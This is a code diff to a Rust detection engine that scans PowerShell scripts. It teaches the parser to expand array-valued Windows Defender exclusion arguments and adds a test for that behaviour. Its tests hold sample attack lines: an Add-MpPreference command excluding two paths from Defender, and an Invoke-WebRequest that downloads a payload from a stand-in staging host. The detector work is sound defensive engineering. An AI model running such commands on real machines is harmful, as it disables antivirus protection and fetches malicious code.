@@ -5588,6 +5588,7 @@ fn powershell_named_argument_list(command: &str, name: &str) -> Vec<String> {
         value_start += 1;
     }
     let mut quote: Option<u8> = None;
+    let mut paren_depth = 0usize;
     let mut value_end = command.len();
     let mut cursor = value_start;
     while cursor < bytes.len() {
@@ -5602,11 +5603,26 @@ fn powershell_named_argument_list(command: &str, name: &str) -> Vec<String> {
             cursor += 1;
             continue;
         }
-        if quote.is_none() && matches!(byte, b';' | b'&' | b'|' | b')') {
+        if quote.is_none() && byte == b'(' {
+            paren_depth += 1;
+            cursor += 1;
+            continue;
+        }
+        if quote.is_none() && byte == b')' {
+            if paren_depth > 0 {
+                paren_depth -= 1;
+                cursor += 1;
+                continue;
+            }
+            value_end = cursor;
+            break;
+        }
+        if quote.is_none() && paren_depth == 0 && matches!(byte, b';' | b'&' | b'|') {
             value_end = cursor;
             break;
         }
         if quote.is_none()
+            && paren_depth == 0
             && byte.is_ascii_whitespace()
             && bytes.get(cursor + 1).is_some_and(|next| *next == b'-')
             && bytes
@@ -8057,7 +8073,17 @@ fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
                 .or_else(|| caps.get(4))
                 .map(|m| m.as_str().to_string())
                 .unwrap_or_default();
-            push(&kind, target);
+            if target == "@(" || target.starts_with("@(") {
+                let argument_name = format!(
+                    "-Exclusion{}",
+                    caps.get(1).map(|m| m.as_str()).unwrap_or_default()
+                );
+                for value in powershell_named_argument_list(line, &argument_name) {
+                    push(&kind, value);
+                }
+            } else {
+                push(&kind, target);
+            }
         }
     }
     push_mppreference_invoke_expression_exclusion_process(deobfuscated, &mut push);
@@ -12042,6 +12068,35 @@ Invoke-WebRequest -Uri https://stage.example/payload.bin -OutFile $env:TEMP\p.bi
             |t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://stage.example/payload.bin")
                 || matches!(t, Trait::Download { src, .. } if src == "https://stage.example/payload.bin")
         ));
+    }
+
+    #[test]
+    fn extracted_script_scan_expands_array_valued_defender_exclusion_paths() {
+        let script = r#"Add-MpPreference -ExclusionPath @('C:\Users\Public', 'D:\Staging')"#;
+        let mut env = Environment::new(&Config::default());
+
+        scan_extracted_script_text(script, &mut env);
+
+        for expected in [r"C:\Users\Public", r"D:\Staging"] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, target }
+                        if action == "exclusion-path" && target == expected
+                )),
+                "array exclusion member {expected} missing: {:?}",
+                env.traits
+            );
+        }
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "exclusion-path" && target == "@("
+            )),
+            "partial array marker must not be emitted: {:?}",
+            env.traits
+        );
     }
 
     #[test]
